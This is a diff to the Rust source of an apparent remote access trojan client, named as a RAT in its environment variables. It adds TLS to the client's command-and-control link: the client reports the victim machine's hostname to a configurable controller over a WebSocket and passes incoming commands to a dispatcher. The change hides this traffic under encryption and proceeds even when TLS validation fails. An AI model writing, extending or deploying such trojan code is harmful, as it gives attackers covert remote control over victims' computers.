@@ -6,7 +6,9 @@ use tokio::sync::mpsc;
 use tokio_tungstenite::{connect_async, tungstenite::Message};
 
 use crate::dispatcher::{CommandMessage, Dispatcher};
-use crate::utils::{is_port_valid, is_valid_ip, Connection};
+use crate::utils::{
+    get_connection_info, is_port_valid, is_valid_ip, validate_tls_connection, Connection,
+};
 
 mod actors;
 mod dispatcher;
@@ -17,19 +19,38 @@ async fn main() {
         .unwrap_or_else(|_| "127.0.0.1".to_string())
         .to_string();
     let host_port = std::env::var("RAT_HOST_PORT").unwrap_or_else(|_| "8080".to_string());
+    let use_tls = std::env::var("RAT_USE_TLS")
+        .unwrap_or_else(|_| "true".to_string())
+        .to_lowercase()
+        == "true";
 
     if !is_valid_ip(&host_ip) || !is_port_valid(&host_port) {
         panic!();
     }
 
+    // Validate TLS configuration
+    if use_tls
+        && !validate_tls_connection(&host_ip, i32::from_str(&host_port).expect("Invalid port"))
+    {
+        dev_print!("Warning: TLS validation failed, but proceeding anyway");
+    }
+
+    dev_print!("{}", get_connection_info(use_tls));
+
     let connection = Connection::from(
         host_ip.to_string(),
         i32::from_str(&host_port).expect("Invalid compile-time port"),
+        use_tls,
     );
 
     loop {
         dev_print!(
-            "Attempting to establish a connection to {}:{}",
+            "Attempting to establish a {} connection to {}:{}",
+            if connection.use_tls {
+                "secure (TLS)"
+            } else {
+                "plain"
+            },
             connection.ip,
             connection.port
         );
@@ -50,19 +71,32 @@ async fn main() {
 async fn run_connection_lifecycle(connection: Connection) -> anyhow::Result<()> {
     let client_id = System::host_name().unwrap_or_else(|| "unknown_client".to_string());
 
+    let scheme = if connection.use_tls { "wss" } else { "ws" };
     let url_str = format!(
-        "ws://{}:{}/ws/{}",
-        connection.ip, connection.port, client_id
+        "{}://{}:{}/ws/{}",
+        scheme, connection.ip, connection.port, client_id
     );
     let url = url::Url::parse(&url_str)?;
 
     let (ws_stream, _response) = match connect_async(url.as_str()).await {
-        Ok((stream, response)) => (stream, response),
+        Ok((stream, response)) => {
+            dev_print!("WebSocket handshake successful");
+            (stream, response)
+        }
         Err(e) => {
-            return Err(anyhow::anyhow!("Failed to connect to WebSocket: {}", e));
+            let error_msg = if connection.use_tls {
+                format!("Failed to establish secure WebSocket connection: {}. Check if the server supports TLS/SSL.", e)
+            } else {
+                format!("Failed to connect to WebSocket: {}", e)
+            };
+            return Err(anyhow::anyhow!(error_msg));
         }
     };
-    dev_print!("Successfully connected to {}", url_str);
+    dev_print!(
+        "Successfully connected to {} (TLS: {})",
+        url_str,
+        connection.use_tls
+    );
 
     let (mut writer, mut reader) = ws_stream.split();
 
